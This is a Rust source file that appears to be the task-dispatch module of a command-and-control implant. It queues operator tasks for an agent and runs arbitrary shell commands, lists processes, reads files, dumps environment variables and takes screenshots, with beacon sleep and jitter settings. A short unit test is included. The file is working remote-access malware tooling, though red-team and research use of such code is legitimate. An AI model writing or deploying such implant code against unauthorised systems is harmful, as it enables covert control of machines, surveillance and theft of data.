use crate::commands;
use crate::Beacon;
use serde::Deserialize;
use serde::Serialize;
use std::collections::VecDeque;

#[derive(Debug, Serialize, Deserialize, Clone)]
pub struct Task {
    pub id: String,
    pub agent_id: String,
    pub command: String,
    pub args: Vec<String>,
    pub status: String,
    pub timestamp: String,
}

#[derive(Debug, Serialize, Deserialize)]
pub struct TaskResult {
    pub task: Task,
    pub output: String,
}

pub struct TasksManager {
    tasks: VecDeque<Task>,
    pub completed_tasks: Vec<TaskResult>,
}

impl TasksManager {
    pub fn new() -> Self {
        TasksManager {
            tasks: VecDeque::new(),
            completed_tasks: Vec::new(),
        }
    }

    pub fn queue(&mut self, task: Task) -> Result<(), String> {
        println!("Queueing task: {:?}", task); // Debug print
        self.tasks.push_back(task);

        Ok(())
    }

    pub fn dispatch(&mut self, beacon: &mut Beacon) -> Result<(), String> {
        if self.tasks.is_empty() {
            println!("No tasks to dispatch.");
            return Ok(());
        }

        while let Some(task) = self.tasks.pop_front() {
            println!("Dispatching task: {:?}", task);

            let args_str = task.args.join(" ");

            let output = match task.command.as_str() {
                "ps" => commands::system::ps(),
                "ls" => commands::file_system::ls_command(&args_str),
                "pwd" => commands::file_system::pwd(),
                "cd" => commands::file_system::cd(&args_str),
                "shell" => commands::execution::shell(&args_str),
                "whoami" => commands::execution::whoami(),
                "cat" => commands::file_system::cat(&args_str),
                "mkdir" => commands::file_system::mkdir(&args_str),
                "env" => commands::system::env(),
                "screenshot" => commands::screenshot::screenshot(),
                "sleep" => self.handle_sleep_command(beacon, &task.args),
                _ => {
                    let err = format!("Unknown command: {}", task.command);
                    println!("{}", err);
                    err
                }
            };

            self.completed_tasks.push(TaskResult { task, output });
        }
        Ok(())
    }

    fn handle_sleep_command(&self, beacon: &mut Beacon, args: &[String]) -> String {
        if args.len() != 2 {
            return "Invalid arguments for sleep command".into();
        }

        let sleep_val = args[0].parse::<u64>().unwrap_or(beacon.sleep.as_secs());
        let jitter_val = args[1].parse::<u64>().unwrap_or(beacon.jitter.as_secs());

        beacon.set_sleep(
            std::time::Duration::from_secs(sleep_val),
            std::time::Duration::from_secs(jitter_val),
        );

        format!(
            "Sleep set to {}s with {}s jitter",
            beacon.sleep.as_secs(),
            beacon.jitter.as_secs()
        )
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_queue_task() {
        let mut tasks = TasksManager {
            tasks: VecDeque::new(),
            completed_tasks: vec![],
        };

        let task = Task {
            id: "abc123".into(),
            agent_id: "agent1".into(),
            command: "ls".into(),
            status: "pending".into(),
            args: vec![],
            timestamp: "2024-01-01T00:00:00Z".into(),
        };

        assert!(tasks.queue(task).is_ok());
        assert_eq!(tasks.tasks.len(), 1);
        // assert!(tasks.dispatch().is_ok());
    }
}
